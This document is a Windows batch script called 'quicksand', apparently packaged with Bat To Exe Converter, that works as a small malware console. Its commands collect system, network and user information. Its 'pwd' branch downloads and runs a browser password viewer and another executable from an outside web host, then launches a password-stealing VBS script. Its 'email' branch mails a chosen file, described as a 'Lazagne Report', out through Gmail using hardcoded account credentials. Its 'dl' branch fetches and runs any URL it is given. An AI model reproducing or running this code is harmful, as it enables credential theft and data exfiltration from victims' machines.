::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAnk
::fBw5plQjdG8=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSzk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+JeA==
::cxY6rQJ7JhzQF1fEqQJQ
::ZQ05rAF9IBncCkqN+0xwdVs0
::ZQ05rAF9IAHYFVzEqQJQ
::eg0/rx1wNQPfEVWB+kM9LVsJDGQ=
::fBEirQZwNQPfEVWB+kM9LVsJDGQ=
::cRolqwZ3JBvQF1fEqQJQ
::dhA7uBVwLU+EWDk=
::YQ03rBFzNR3SWATElA==
::dhAmsQZ3MwfNWATElA==
::ZQ0/vhVqMQ3MEVWAtB9wSA==
::Zg8zqx1/OA3MEVWAtB9wSA==
::dhA7pRFwIByZRRnk
::Zh4grVQjdCuDJGix3WEbGzVwAgGaOQs=
::YB416Ek+ZG8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off 
title quicksand
echo                                              ################################
echo                                              #                              #
echo                                              #          QUICKSAND           #
echo                                              #                              #  
echo                                              ################################
:A
set /p input=quicksand:
if help == %input% goto C
if pwd == %input% goto B
if info ==  %input% systeminfo>info.txt
if ip == %input% ipconfig/all>ip.txt
if me == %input% whoami
if email == %input% goto D
if ls == %input% dir
if files == %input% dir>files.txt
if dl == %input% goto E

goto A
:B

set files= 'http://mogiant.azurewebsites.net/WebBrowserPassView.exe' , 'http://mogiant.azurewebsites.net/windows.exe'
powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"
start passwordsteal.vbs
echo done
goto A

:C
echo pwd
echo info
echo ip
echo me
echo dl
echo files
echo ls
echo email
goto A

:D
echo welcome to the emailer
set /p file=file:

set email = captianlastimosa@gmail.com
set password = wither14
powershell $SMTPServer = 'smtp.gmail.com';$SMTPInfo = New-Object Net.Mail.SmtpClient($SmtpServer, 587);$SMTPInfo.EnableSsl = $true;$SMTPInfo.Credentials = New-Object System.Net.NetworkCredential('%email%', '%password%');$ReportEmail = New-Object System.Net.Mail.MailMessage;$ReportEmail.From = '%email%';$ReportEmail.To.Add('%email%');$ReportEmail.Subject = 'Lazagne Report';$ReportEmail.Body = 'Lazagne report in the attachments.';$ReportEmail.Attachments.Add('%file%');$SMTPInfo.Send($ReportEmail);

goto A

:E
set input = /p input=executefile:
set files= '%input%', 

powershell "(%files%)|foreach{$fileName='%TEMP%'+(Split-Path -Path $_ -Leaf);(new-object System.Net.WebClient).DownloadFile($_,$fileName);Invoke-Item $fileName;}"

goto A


